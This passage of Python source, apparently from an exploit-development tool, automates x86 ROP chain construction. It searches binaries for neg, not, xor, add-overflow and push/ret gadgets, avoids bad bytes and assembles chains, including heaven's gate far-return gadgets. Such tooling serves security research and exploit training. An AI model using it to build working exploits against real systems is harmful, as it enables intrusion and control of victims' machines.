	addChain(pushOut[pu1], "Final push/ret to lead to retf", [], hgOuts,7)

	dp ("heaven's gate 33")
	showChain(hgOuts)
	return
		
def foundIntOverflows2(val,desired,bad):
	val=int(val,16)
	needed=0xffffffff-val
	target=needed + desired+1
	dp ("from the gadget:",hex(val),"\ttarget", hex(target), "actual", hex(truncate(target+val,32)))
	if truncate(target+val,32) == desired :
		dp ("\tGot desired")
		if len(hex(target)) >8  and len(hex(target)) <11:
			dp ("\t\tmatch!!!!!!!!!!")
			return True, target
		else:
			dp("\t\ttoo long!!!")

			return False,0,0

	else:
		return False,0,0
		

def disOffset(offset):
	obj=fg.rop[offset]
	CODED2=obj.raw
	offset=obj.offset
	returnVal = ""
	for i in cs.disasm(CODED2, offset):
		val =  i.mnemonic + " " + i.op_str + " # "
		returnVal +=val
	returnVal=returnVal[:-3]
	return returnVal

def foundIntOverflows(myDict, desired,bad):
	for g in myDict:
		# dp (g, type(g))
		# dp (myDict[g].op2, "    ---------       ",disOffset2(g,fg) )
		try:
			if myDict[g].length ==1 and len(myDict[g].op2) > 4:
				if checkFreeBadBytes(opt,fg,g,bad,fg.rop, pe, opt["bad_bytes_imgbase"]):
					# dp ("\n\n************", myDict[g].op2)
					foundOverflow,target=	foundIntOverflows2(myDict[g].op2, desired,bad)
					if foundOverflow:
						return foundOverflow,target,g
						break
		except:
			pass
		# if myDict[g].length ==1 and len(myDict[g].op2) > 3 and len(myDict[g].op2) <6:
		# 	dp ("\n\toooooh yeah", myDict[g].op2)
		# 	mathStuff2(myDict[g].op2, desired)
	return False,0,0
def twos_complement_hex(n):
	if n >= 0:
		return (n)  # positive numbers are represented as-is
	else:
		return ((1 << 32) + n)  # compute two's complement

def not_(val):
	bad=(~val)
	bad2=twos_complement_hex(bad)
	dp(hex(bad2))
	return int(hex(bad2),16)
	# return bad


def xor_(val,val2):
	res=val ^ val2
	return res
	# return bad


def twos_complement_neg(n):
    # compute the absolute value of n
    abs_n = (~n & 0xFFFFFFFF) + 1
    # compute the two's complement negation of n
    neg_n = -abs_n
    # return the result as a signed 2's complement number
    return abs(neg_n & 0xFFFFFFFF) if neg_n >= 0 else (abs((~(-neg_n & 0xFFFFFFFF)) + 1))


def int2hex(number, bits):
    if number < 0:
        try:
        	num=int(hex((1 << bits) + number),16)
        except:
        	num=int(hex((1 << bits) + number))
        return num
    else:
        return number

def findingNeg1(myDict, desired,bad):
	dp ("finding findingNeg1")
	try: 
		dp ("myDict", myDict, type(myDict))
		# for g in myDict:
		if type(myDict)==int:
			dp ("bad type, int not dict")
			return False,0,0

		toThis=len(myDict)
		for g in range(0, toThis):
			dp ("g", type(g), "myDict", type(myDict))

			dp (g, type(g))
			dp (myDict[g].op2, "    ---------       ",disOffset(g) )
		
			if myDict[g].length ==1:
				if checkFreeBadBytes(opt,fg,g,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"]):

					target=	twos_complement_neg(desired)
					dp ("neg/not target:",hex(target))
					ans=twos_complement_neg(target)
					dp ("ans", hex(ans), hex(desired))
					if ans==desired and len(hex(target)) >8  and len(hex(target)) <11 and checkFreeBadBytes(opt,fg,target,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"],True):

						return True, target, g
					# else:
					# 	dp ("NO!!!fs")
					# else:
					# 	dp("unacceptable size")
				
	except Exception as e:
		dp ("exception findingneg1:")
		dp (e)
		dp(traceback.format_exc())
		dp ("error")
		pass
	except TypeError as e:
		dp ("exception findingneg1:")
		dp (e)
		dp ("g", type(g))
		dp(g)
		dp(traceback.format_exc())
		dp ("error")
		pass
	return False,0,0

def findingXor1(myDict, desired,bad,availableRegs,bb):
	# print (gre+"findingXor1", desired, "availableRegs",availableRegs,res)
	t=0
	for g in myDict:
		# dp (g, type(g))
		dp (t, myDict[g].op2, "    ---------       ",disOffset(g) )
		# print (t, myDict[g].op2, "    ---------       ",disOffset(g) )

		try:
			if myDict[g].length ==1:
				if checkFreeBadBytes(opt,fg,g,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"]):

					special=bb.giveXor()
					target=	xor_(desired,special)
					dp ("xor target:",hex(target))
					ans=xor_(target,special)
					# print (yel+"special", hex(special), "target", hex(target),"ans", hex(ans),res, "myDict[g].op1",myDict[g].op1, yel+"myDict[g].op2",myDict[g].op2,res)
					dp ("ans", hex(ans), hex(desired), "\t",disOffset(g))
					isRegOp1= re.match( r'e[b|c|d|a]x|e[d|s]i|e[s|b]p',(myDict[g].op1), re.M|re.I)
					# print ("myDict[g].op2 for item in availableRegs",any(item in myDict[g].op2 for item in availableRegs), blu+"isRegOp1",isRegOp1, res )
					# print ("checkingforbadbytes",checkFreeBadBytes(opt,fg,target,bad), hex(ans), "bad",bad)
					if ans==desired and len(hex(target)) >8  and len(hex(target)) <11 and checkFreeBadBytes(opt,fg,target,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"],True) and any(item in myDict[g].op2 for item in availableRegs) and isRegOp1:
						dp ("return true")
						return True, target, g, special, myDict[g].op2
		
		except Exception as e:
			dp ("exception findingXor1:")
			dp (e)
			dp(traceback.format_exc())
			dp ("error")
			pass
		t+=1
	dp ("return false")
	return False,0,0,0,0

def findingFoundXor1(myDict, desired,bad,availableRegs,bb,enforceNoBadBytes):
	t=0
	for g in myDict:
		# dp (g, type(g))
		# dp (t, myDict[g].op2, "    ---------       ",disOffset(g) )
		# print (t, myDict[g].op2, "    ---------       ",disOffset(g) )
		try:
			isReg= re.match( r'e[b|c|d|a]x|e[d|s]i|e[s|b]p|[b|c|d|a]l|[b|c|d|a]h|si|di|bp|sp',(myDict[g].op2), re.M|re.I)
			isRegOp1= re.match( r'e[b|c|d|a]x|e[d|s]i|e[s|b]p',(myDict[g].op1), re.M|re.I)
			if myDict[g].length ==1 and not isReg and isRegOp1:
				dp(disOffset(g))
				# print(disOffset(g))
				try:
					special=int(myDict[g].op2)
				except:
					special=int(myDict[g].op2,16)
				target=	xor_(desired,special)
				dp ("xor target:",hex(target), "special", hex(special))
				ans=xor_(target,special)
				# print ("ans", hex(ans), "special", hex(special), "target",hex(target), hex(desired), disOffset(g))
				dp ("ans", hex(ans), hex(desired), "\t",disOffset(g))
				if ans==desired and checkFreeBadBytes(opt,fg,target,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"],True):
					dp ("return true")
					# print (checkFreeBadBytes(opt,fg,g,bad), g, hex(g), hex(img(g)))
					return True, target, g
		except Exception as e:
			dp ("exception findingXor1:")
			dp (e)
			# print (red, e, res)
			dp(traceback.format_exc())
			dp ("error")
			pass
		t+=1
	dp ("return false foundxor")
	return False,0,0

def findingNot1(myDict, desired,bad):
	for g in myDict:
		# dp (g, type(g))
		# dp (myDict[g].op2, "    ---------       ",disOffset(g) )
		try:
			if myDict[g].length ==1:
				if checkFreeBadBytes(opt,fg,g,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"]):

					target=	not_(desired)
					# target+=1
					dp ("not target:",hex(target))
					ans=not_(target)
					dp ("ans", hex(ans), hex(desired))
					if ans==desired and len(hex(target)) >8  and len(hex(target)) <11 and checkFreeBadBytes(opt,fg,target,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"],True):
						return True, target, g
					# else:
					# 	dp("unacceptable size")
		except:
			dp ("error")
			pass
	return False,0,0
def buildNeg(desired,excludeRegs, bad, withPR=True,firstReg=False):
	if firstReg!=None:
		negSucess, package=buildNegTarget(desired,excludeRegs, bad, withPR,firstReg)
	else:
		negSucess, package=buildNeg(desired,excludeRegs, bad, withPR,firstReg)
	return negSucess, package

def buildNegTarget(desired,excludeRegs, bad, withPR=True, firstReg=False):
	print ("buildNegTarget")
	dp ("\n\nbuildNeg", hex(desired))
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	try:
		for reg in excludeRegs:
			availableRegs.remove(reg)
	except:
		pass
	dp ("availableRegs",availableRegs)
	bExists, myDict=fg.getFg("neg",firstReg)
	bExistsP, myDictP=fg.getFg("pop",firstReg)
	if not bExists and not bExistsP:
		return False, 0
	negFound, preNeg,f1 = findingNeg1(myDict,desired,bad)
	if not negFound:
		return False, 0
	if negFound:
		foundP1, p1, popD1 = findPop(firstReg,bad,True,excludeRegs)
		if withPR:
			foundPu1, pu1, pushD1 = findPush(firstReg,bad,True,excludeRegs,-4)
		else:
			foundPu1=True
		if negFound and foundP1 and foundPu1:
			# print ("found them")
			tryThis=tryThisFunc(desired)
			rp1=chainObj(p1, "loading value for neg", [preNeg])
			rp2=chainObj(f1, hex(preNeg) + " -> " + hex(desired) + tryThis, [])
			rOut=[rp1, rp2]
			if withPR:
				prObj=chainObj(pu1, "Push/ret - going to 0x" + hx(desired,8), [])
				rOut.extend([prObj])
			showChain(rOut)
			return negFound, rOut
	return False,0

def buildNeg2(desired,excludeRegs, bad, withPR=True, firstReg=False):
	dp ("\n\nbuildNeg", hex(desired))
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	try:
		for reg in excludeRegs:
			availableRegs.remove(reg)
	except:
		pass
	dp ("availableRegs",availableRegs)
	for reg in availableRegs:
		bExists, myDict=fg.getFg("neg",reg)
		bExistsP, myDictP=fg.getFg("pop",reg)
		if not bExists and not bExistsP:
			continue
		negFound, preNeg,f1 = findingNeg1(myDict,desired,bad)
		if not negFound:
			continue
		if negFound:
			foundP1, p1, popD1 = findPop(reg,bad,True,excludeRegs)
			if withPR:
				foundPu1, pu1, pushD1 = findPush(reg,bad,True,excludeRegs,-4)
			else:
				foundPu1=True
			if negFound and foundP1 and foundPu1:
				# print ("found them")
				tryThis=tryThisFunc(desired)
				rp1=chainObj(p1, "loading value for neg", [preNeg])
				rp2=chainObj(f1, hex(preNeg) + " -> " + hex(desired) + tryThis, [])
				rOut=[rp1, rp2]
				if withPR:
					prObj=chainObj(pu1, "Push/ret - going to 0x" + hx(desired,8), [])
					rOut.extend([prObj])
				showChain(rOut)
				return negFound, rOut
	return False,0

def buildFoundXor(desired,excludeRegs, bad,bb,withPR=True, firstReg=None, comment="",isVal=False):
	if firstReg != None:
		foundXorSuccess, package=buildFoundXorTarget(desired,excludeRegs, bad,bb,withPR, firstReg, comment,isVal)
	else:
		foundXorSuccess, package=buildFoundXor2(desired,excludeRegs, bad,bb,withPR, firstReg)
	return foundXorSuccess, package

def buildFoundXorTarget(desired,excludeRegs, bad,bb,withPR=True, firstReg=None, comment="",isVal=False):
	enforceNoBadBytes=False
	# print ("buildFoundXorTarget", "desired", hex(desired), "firstReg", firstReg)
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for r in excludeRegs:
		availableRegs.remove(r)
	dp ("\n\nbuildFoundxor", hex(desired))
	# print ("regFirst", firstReg)

	bExists, myDict=fg.getFg("xor",firstReg)
	bExistsP, myDictP=fg.getFg("pop",firstReg)
	# print ("bExists", bExists, "bExistsP", bExistsP)
	if not bExists and not bExistsP:
		return False, 0
	xorFound, xorVal,x1 = findingFoundXor1(myDict,desired,bad, availableRegs,bb, enforceNoBadBytes)
	if not xorFound:
		dp ("NO xor found ", firstReg)
		# print ("NO xor found ", firstReg)

	if xorFound:
		# print ("xor found", hex(xorVal), hex(x1), disOffset(x1), img(x1))
		
		#disMini(myDict[t].g.raw, myDict[t].g.offset)
		#cOut+= gre+"\t"+  "0x"+str(hx (img(t,myDict), 8))+ whi+", # " + yel+ disMini(myDict[t].g.raw, myDict[t].g.offset) + whi+ " # " +cya+ myDict[t].comment + whi+ " # " +blu+ myDict[t].g.mod +whi+"\n"
		#def img(p, fg2=None):


#bramwell		
		dp ("xor found", hex(xorVal), hex(x1), disOffset(x1))
		foundP1, p1, popD1 = findPop(firstReg,bad,True,excludeRegs)

		if withPR:
			foundPu1, pu1, pushD1 = findPush(firstReg,bad,True,excludeRegs,-4)
		else:
			foundPu1=True
		if xorFound and foundP1 and foundPu1:
			# try:
			# 	tryThis= " -> " + disOffset(desired)
			# 	dp (tryThis)
			# except Exception as e:
			# 	tryThis=""
			# print ("comment", comment)
			tryThis=tryThisFunc(desired)
			rp1=chainObj(p1, "loading XOR value", [xorVal])
			rp2=chainObj(x1, hex(xorVal) + " ^ " + fg.rop[x1].op2 + " = " + hex(desired) +tryThis + " - " + comment, [])
			rOut=[rp1, rp2]
			if withPR:
				prObj=chainObj(pu1, "Push/ret - going to 0x" + hx(desired,8), [])
				rOut.extend([prObj])

			showChain(rOut)
			cOut,out=genOutput(rOut)
			return xorFound, rOut
	return False,0
def buildFoundXor2(desired,excludeRegs, bad,bb,withPR=True, firstReg=None):
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	enforceNoBadBytes=False
	for r in excludeRegs:
		availableRegs.remove(r)
	dp ("\n\nbuildFoundxor", hex(desired))
	for reg in availableRegs:
		bExists, myDict=fg.getFg("xor",reg)
		bExistsP, myDictP=fg.getFg("pop",reg)
		if not bExists and not bExistsP:
			continue
		xorFound, xorVal,x1 = findingFoundXor1(myDict,desired,bad, availableRegs,bb, enforceNoBadBytes)
		if not xorFound:
			dp ("NO xor found ", reg)
		if xorFound:
			dp ("xor found", hex(xorVal), hex(x1), disOffset(x1))
			foundP1, p1, popD1 = findPop(reg,bad,True,excludeRegs)

			if withPR:
				foundPu1, pu1, pushD1 = findPush(reg,bad,True,excludeRegs,-4)
			else:
				foundPu1=True
			if xorFound and foundP1 and foundPu1:
				# try:
				# 	tryThis= " -> " + disOffset(desired)
				# 	dp (tryThis)
				# except Exception as e:
				# 	tryThis=""
				tryThis=tryThisFunc(desired)
				rp1=chainObj(p1, "loading XOR value", [xorVal])
				rp2=chainObj(x1, hex(xorVal) + " ^ " + fg.rop[x1].op2 + " = " + hex(desired) +tryThis, [])
				rOut=[rp1, rp2]
				if withPR:
					prObj=chainObj(pu1, "Push/ret - going to 0x" + hx(desired,8), [])
					rOut.extend([prObj])

				showChain(rOut)
				cOut,out=genOutput(rOut)
				return xorFound, rOut
	return False,0
def buildXor(desired,excludeRegs,bad, bb,withPR=True, firstReg=None, comment=None,isVal=False):
	# print ("buildXor", firstReg)
	if firstReg!=None:
		xorSucccess, package=buildXorTarget(desired,excludeRegs,bad, bb,withPR,firstReg,comment,isVal)
	else:
		xorSucccess, package=buildXor2(desired,excludeRegs,bad, bb,withPR,firstReg)
	return xorSucccess, package

def buildXorTarget(desired,excludeRegs,bad, bb,withPR=True, firstReg=None, comment=None,isVal=False):
	# print (red+"buildXorTarget","firstReg",firstReg,"desired",hex(desired),res)
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for r in excludeRegs:
		availableRegs.remove(r)
		dp ("\n\nbuildxor", hex(desired))

	bExists, myDict=fg.getFg("xor",firstReg)
	bExistsP, myDictP=fg.getFg("pop",firstReg)
	if not bExists and not bExistsP:
		# print (yel+"returning false",res)
		return False,0
	xorFound, xorVal,x1,key, secondReg = findingXor1(myDict,desired,bad, availableRegs,bb)
	if xorFound:
		dp ("xor found", hex(xorVal), hex(x1), disOffset(x1))
		dp(secondReg, "secondReg")
		foundP1, p1, popD1 = findPop(firstReg,bad,True,excludeRegs)
		foundP2, p2, popD2 = findPop(secondReg,bad,True,excludeRegs)

		if withPR:
			foundPu1, pu1, pushD1 = findPush(firstReg,bad,True,excludeRegs,-4)
		else:
			foundPu1=True
		if xorFound and foundP1 and foundPu1:
			try:
				tryThis= " -> " + disOffset(desired)
				dp (tryThis)
			except Exception as e:
				tryThis=""
			tryThis=tryThisFunc(desired)				
			rp1=chainObj(p1, "loading first XOR value", [xorVal])
			rp2=chainObj(p2, "loading second XOR value", [key])
			com1 = redundantComChecker("",hex(desired) +tryThis,comment)
			rp3=chainObj(x1, hex(xorVal) + " ^ " + hex(key) + " = " + hex(desired) + " - " + com1, [])

			# rp3=chainObj(x1, hex(xorVal) + " ^ " + hex(key) + " = " + hex(desired) +tryThis + " - "+comment, [])
			rOut=[rp1, rp2,rp3]
			if withPR:
				prObj=chainObj(pu1, "Push/ret - going to 0x" + hx(desired,8), [])
				rOut.extend([prObj])

			showChain(rOut)
			return xorFound, rOut
	dp ("return false xor")
	return False,0

def buildXor2(desired,excludeRegs,bad, bb,withPR=True, firstReg=None):
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for r in excludeRegs:
		availableRegs.remove(r)
	dp ("\n\nbuildxor", hex(desired))

	for reg in availableRegs:
		bExists, myDict=fg.getFg("xor",reg)
		bExistsP, myDictP=fg.getFg("pop",reg)
		if not bExists and not bExistsP:
			continue
		xorFound, xorVal,x1,key, secondReg = findingXor1(myDict,desired,bad, availableRegs,bb)
		if xorFound:
			dp ("xor found", hex(xorVal), hex(x1), disOffset(x1))
			dp(secondReg, "secondReg")
			foundP1, p1, popD1 = findPop(reg,bad,True,excludeRegs)
			foundP2, p2, popD2 = findPop(secondReg,bad,True,excludeRegs)

			if withPR:
				foundPu1, pu1, pushD1 = findPush(reg,bad,True,excludeRegs,-4)
			else:
				foundPu1=True
			if xorFound and foundP1 and foundPu1:
				try:
					tryThis= " -> " + disOffset(desired)
					dp (tryThis)
				except Exception as e:
					tryThis=""
				tryThis=tryThisFunc(desired)				
				rp1=chainObj(p1, "loading first XOR value", [xorVal])
				rp2=chainObj(p2, "loading second XOR value", [key])
				rp3=chainObj(x1, hex(xorVal) + " ^ " + hex(key) + " = " + hex(desired) +tryThis, [])
				rOut=[rp1, rp2,rp3]
				if withPR:
					prObj=chainObj(pu1, "Push/ret - going to 0x" + hx(desired,8), [])
					rOut.extend([prObj])

				showChain(rOut)
				return xorFound, rOut
	dp ("return false xor")
	return False,0

def buildNot(desired,excludeRegs, bad,withPR=True, firstReg=None,comment="",isVal=False):
	
	if firstReg !=None:
		foundNot,package =	buildNotTarget(desired,excludeRegs, bad,withPR, firstReg, comment,isVal)
	else:
		foundNot,package =buildNot2(desired,excludeRegs, bad,withPR, firstReg)
	return foundNot,package 

def redundantComChecker(com1,phrase,comment):
	try:
		if phrase in comment:
		# print ("it is already there")
			com1=comment
		else:
			com1=phrase
		return com1
	except:
		return phrase
def buildNotTarget(desired,excludeRegs, bad,withPR=True, firstReg=None,comment="",isVal=False):
	dp ("\n\nbuildNot", hex(desired))
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	
	bExists, myDict=fg.getFg("notInst",firstReg)
	bExistsP, myDictP=fg.getFg("pop",firstReg)
	if not bExists and not bExistsP:
		return False, 0
	negFound, preNot,f1 = findingNot1(myDict,desired,bad)
	if negFound:
		foundP1, p1, popD1 = findPop(firstReg,bad,True,excludeRegs)
		if withPR:
			foundPu1, pu1, pushD1 = findPush(firstReg,bad,True,excludeRegs,-4)
		else:
			foundPu1=True
		if negFound and foundP1 and foundPu1:
			tryThis=tryThisFunc(desired)
			rp1=chainObj(p1, "loading value for not", [preNot])
			com1 = redundantComChecker("Not = ",hex(desired) + tryThis,comment)
			rp2=chainObj(f1, hex(preNot) + " - "+com1, [])
			rOut=[rp1, rp2]
			if withPR:
				prObj=chainObj(pu1, "Push/ret - going to 0x" + hx(desired,8), [])
				rOut.extend([prObj])

			showChain(rOut)
			return negFound, rOut
	return False,0

def buildNot2(desired,excludeRegs, bad,withPR=True, firstReg=None):
	# print (red+"buildnot2 firstReg", firstReg, "desired", desired,res)
	dp ("\n\nbuildNot", hex(desired))
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for reg in excludeRegs:
		availableRegs.remove(reg)

	for reg in availableRegs:
		bExists, myDict=fg.getFg("notInst",reg)
		bExistsP, myDictP=fg.getFg("pop",reg)
		if not bExists and not bExistsP:
			continue
		negFound, preNot,f1 = findingNot1(myDict,desired,bad)
		if negFound:
			foundP1, p1, popD1 = findPop(reg,bad,True,excludeRegs)
			if withPR:
				foundPu1, pu1, pushD1 = findPush(reg,bad,True,excludeRegs,-4)
			else:
				foundPu1=True
			if negFound and foundP1 and foundPu1:
				tryThis=tryThisFunc(desired)
				rp1=chainObj(p1, "loading value for not", [preNot])
				rp2=chainObj(f1, hex(preNot) + " -> " + hex(desired) + tryThis, [])
				rOut=[rp1, rp2]
				if withPR:
					prObj=chainObj(pu1, "Push/ret - going to 0x" + hx(desired,8), [])
					rOut.extend([prObj])

				showChain(rOut)
				return negFound, rOut
	return False,0
def buildFoundIntOv(desired,excludeRegs,bad, withPR=True,regFirst=None, comment=None,isVal=False):
	# print (yel,"regFirst", regFirst,res)
	# regFirst="ebp"
	if regFirst!=None:
		foundInt2,package = buildFoundIntOvTarget(desired,excludeRegs,bad, withPR, regFirst,comment,isVal)
	else:
		foundInt2,package = buildFoundIntOv2(desired,excludeRegs,bad, withPR, regFirst)

	return foundInt2,package
def buildFoundIntOvTarget(desired,excludeRegs,bad, withPR=True, regFirst=None, comment=None,isVal=False):
	dp ("buildFoundIntOv", hex(desired))
	# print (red+"buildFoundIntOv", "regFirst", regFirst, "goal", desired, res)
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for reg in excludeRegs:
		availableRegs.remove(reg)


	bExists, myDict=fg.getFg("add",regFirst)
	bExistsP, myDictP=fg.getFg("pop",regFirst)
	if not bExists and not bExistsP:
		return False,0
	intFound, overflow,f1 = foundIntOverflows(myDict,desired,bad)
	foundP1, p1, popD1 = findPop(regFirst,bad,True,excludeRegs)
	if not intFound:
		# print ("intFound ")
		return False,0
	if not foundP1:
		# print ("foundP1 ")
		return False,0
	if withPR:
		foundPu1, pu1, pushD1 = findPush(regFirst,bad,True,excludeRegs,-4)
	else:
		foundPu1=True
	if intFound and foundP1 and foundPu1:
		dp("found the trio")
		
		tryThis=tryThisFunc(desired)
		rp1=chainObj(p1, "first pop", [overflow])
		com1 = redundantComChecker("",hex(desired) +tryThis,comment)

		rp2=chainObj(f1, hex(overflow) + " + " + fg.rop[f1].op2 + " = " + hex(desired) + com1, [])

		rOut=[rp1, rp2]
		if withPR:
			prObj=chainObj(pu1, "Push/ret - going to 0x" + hx(desired,8), [])
			rOut.extend([prObj])

		# showChain(rOut)
		return intFound, rOut
	# showChain(rOut)
	return False,0

def buildFoundIntOv2(desired,excludeRegs,bad, withPR=True, regFirst=None):
	dp ("buildFoundIntOv", hex(desired))
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for reg in excludeRegs:
		availableRegs.remove(reg)

	for reg in availableRegs:
		bExists, myDict=fg.getFg("add",reg)
		bExistsP, myDictP=fg.getFg("pop",reg)
		if not bExists and not bExistsP:
			continue
		intFound, overflow,f1 = foundIntOverflows(myDict,desired,bad)
		foundP1, p1, popD1 = findPop(reg,bad,True,excludeRegs)
		if not intFound:
			# print ("intFound continue")
			continue
		if not foundP1:
			# print ("foundP1 continue")
			continue
		if withPR:
			foundPu1, pu1, pushD1 = findPush(reg,bad,True,excludeRegs,-4)
		else:
			foundPu1=True
		if intFound and foundP1 and foundPu1:
			dp ("found the trio")
			
			tryThis=tryThisFunc(desired)
			rp1=chainObj(p1, "first pop", [overflow])
			rp2=chainObj(f1, hex(overflow) + " + " + fg.rop[f1].op2 + " = " + hex(desired) + tryThis, [])

			rOut=[rp1, rp2]
			if withPR:
				prObj=chainObj(pu1, "Push/ret - going to 0x" + hx(desired,8), [])
				rOut.extend([prObj])

			showChain(rOut)
			return intFound, rOut
	return False,0
def postDoublePush():
	myDict=fg.push

	for q in myDict:
		addy = myDict[q].addressRet
		off = myDict[q].offset
		raw=myDict[q].raw
		length=myDict[q].length
		mod=myDict[q].mod
		
		test=disMini(raw, off)
		num=test.count("push")
		if num == 2:
			l,m=disMiniArray(raw, addy, off)
			t=0
			first=""
			second=""
			checkedFirst=False
			prevVisited=False
			for line in l:
				if re.match( r'^push',line, re.M|re.I):
					if re.match( r'e[b|c|d|a]x|e[d|s]i|e[s|b]p',m[t], re.M|re.I):	
						if not checkedFirst:
							first = m[t]
							checkedFirst=True
						if prevVisited:
							if first != m[t]:
								second=m[t]
								dp ("have candidate", test)
								out, hgadgetstatus=rop_testerDoublePush(raw,first,second)
								

								
								if hgadgetstatus:
									myDict[q].addHg1(first)
									myDict[q].addHg2(second)
									myDict[q].setRegsObj(out,"hg")
									myDict[q].setHgDiff(out.hgDiff)
									fg.hgGadgets[q] = myDict[q]
						prevVisited=True


				t+=1

	dp ("find push", first)
	bExists,out=fg.getFg("push",first)
	if bExists:
		dp ("got push")
	dp("fg.hgGadgets", len(fg.hgGadgets))
	for h in fg.hgGadgets:
		dp (fg.hgGadgets[h].hg1, fg.hgGadgets[h].hg2, disMini(fg.hgGadgets[h].raw,fg.hgGadgets[h].offset))
		dp("hgdiff",fg.hgGadgets[h].hgDiff)
		dp("obj",fg.hgGadgets[h].hgRegs.eax, fg.hgGadgets[h].hgRegs.ebx, fg.hgGadgets[h].hgRegs.ecx, fg.hgGadgets[h].hgRegs.edx,fg.hgGadgets[h].hgRegs.esi, fg.hgGadgets[h].hgRegs.edi, "esp", hex(fg.hgGadgets[h].hgRegs.esp), "diffesp", hex(fg.hgGadgets[h].hgRegs.diffEsp))

	# dp ("my retfs haha", len(fg.retfSingle))
	# for r in fg.retfSingle:
	# 	dp( hex(fg.retfSingle[r].offset), disMini(fg.retfSingle[r].raw,fg.retfSingle[r].offset))



pop="pop"
push="push"
inc="inc"
dec="dec"
add="add"
addDword="add dword"
subDword="sub dword"
sub="sub"
mul="mul"
div="div"
lea="lea"
mov="mov"
movDword="mov dword"
neg = "neg"
xor = "xor"
xorZero = "xor zero"
xorDword = "xor dword"
movConstant="mov constant"
xchg="xchg"

def printOutputs():
	printRetDict(pop, "ALL", fg.pops)
	printRetDict(pop, "eax", fg.popEAX)
	printRetDict(pop, "ebx", fg.popEBX)
	printRetDict(pop, "ecx", fg.popECX)
	printRetDict(pop, "edx", fg.popEDX)
	printRetDict(pop, "edi", fg.popEDI)
	printRetDict(pop, "esi", fg.popESI)
	printRetDict(pop, "ebp", fg.popEBP)
	printRetDict(pop, "esp", fg.popESP)

	printRetDict(push, "all", fg.push)

	printRetDict(push, "esp", fg.pushESP)
	printRetDict(push, "ebp", fg.pushEBP)
	printRetDict(push, "eax", fg.pushEAX)
	printRetDict(push, "ebx", fg.pushEBX)
	printRetDict(push, "ecx", fg.pushECX)
	printRetDict(push, "edx", fg.pushEDX)
	printRetDict(push, "edi", fg.pushEDI)
	printRetDict(push, "esi", fg.pushESI)
	printRetDict(push, "constant", fg.pushConstant)
	printRetDict(push, "dword ptr", fg.pushDword)
	printRetDict(pop, "other", fg.popOther)
	printRetDict(push, "other", fg.pushOther)


	printRetDict(inc, "esp", fg.incESP)
	printRetDict(inc, "ebp", fg.incEBP)
	printRetDict(inc, "eax", fg.incEAX)
	printRetDict(inc, "ebx", fg.incEBX)
	printRetDict(inc, "ecx", fg.incECX)
	printRetDict(inc, "edx", fg.incEDX)
	printRetDict(inc, "edi", fg.incEDI)
	printRetDict(inc, "esi", fg.incESI)


	printRetDict(dec, "esp", fg.decESP)
	printRetDict(dec, "ebp", fg.decEBP)
	printRetDict(dec, "eax", fg.decEAX)
	printRetDict(dec, "ebx", fg.decEBX)
	printRetDict(dec, "ecx", fg.decECX)
	printRetDict(dec, "edx", fg.decEDX)
	printRetDict(dec, "edi", fg.decEDI)
	printRetDict(dec, "esi", fg.decESI)

	printRetDict(add, "esp", fg.addESP)
	printRetDict(add, "espVal", fg.addESPVal)
	printRetDict(add, "ebp", fg.addEBP)
	printRetDict(add, "eax", fg.addEAX)
	printRetDict(add, "ebx", fg.addEBX)
	printRetDict(add, "ecx", fg.addECX)
	printRetDict(add, "edx", fg.addEDX)
	printRetDict(add, "edi", fg.addEDI)
	printRetDict(add, "esi", fg.addESI)

	printRetDict(addDword, "esp", fg.addDwordESP)
	printRetDict(addDword, "ebp", fg.addDwordEBP)
	printRetDict(addDword, "eax", fg.addDwordEAX)
	printRetDict(addDword, "ebx", fg.addDwordEBX)
	printRetDict(addDword, "ecx", fg.addDwordECX)
	printRetDict(addDword, "edx", fg.addDwordEDX)
	printRetDict(addDword, "edi", fg.addDwordEDI)
	printRetDict(addDword, "esi", fg.addDwordESI)

	printRetDict(sub, "esp", fg.subESP)
	printRetDict(sub, "ebp", fg.subEBP)
	printRetDict(sub, "eax", fg.subEAX)
	printRetDict(sub, "ebx", fg.subEBX)
	printRetDict(sub, "ecx", fg.subECX)
	printRetDict(sub, "edx", fg.subEDX)
	printRetDict(sub, "edi", fg.subEDI)
	printRetDict(sub, "esi", fg.subESI)

	printRetDict(subDword, "esp", fg.subDwordESP)
	printRetDict(subDword, "ebp", fg.subDwordEBP)
	printRetDict(subDword, "eax", fg.subDwordEAX)
	printRetDict(subDword, "ebx", fg.subDwordEBX)
	printRetDict(subDword, "ecx", fg.subDwordECX)
	printRetDict(subDword, "edx", fg.subDwordEDX)
	printRetDict(subDword, "edi", fg.subDwordEDI)
	printRetDict(subDword, "esi", fg.subDwordESI)

	printRetDict(mul, "esp", fg.mulESP)
	printRetDict(mul, "ebp", fg.mulEBP)
	printRetDict(mul, "eax", fg.mulEAX)
	printRetDict(mul, "ebx", fg.mulEBX)
	printRetDict(mul, "ecx", fg.mulECX)
	printRetDict(mul, "edx", fg.mulEDX)
	printRetDict(mul, "edi", fg.mulEDI)
	printRetDict(mul, "esi", fg.mulESI)


	printRetDict(div, "esp", fg.divESP)
	printRetDict(div, "ebp", fg.divEBP)
	printRetDict(div, "eax", fg.divEAX)
	printRetDict(div, "ebx", fg.divEBX)
	printRetDict(div, "ecx", fg.divECX)
	printRetDict(div, "edx", fg.divEDX)
	printRetDict(div, "edi", fg.divEDI)
	printRetDict(div, "esi", fg.divESI)

	printRetDict(lea, "esp", fg.leaESP)
	printRetDict(lea, "ebp", fg.leaEBP)
	printRetDict(lea, "eax", fg.leaEAX)
	printRetDict(lea, "ebx", fg.leaEBX)
	printRetDict(lea, "ecx", fg.leaECX)
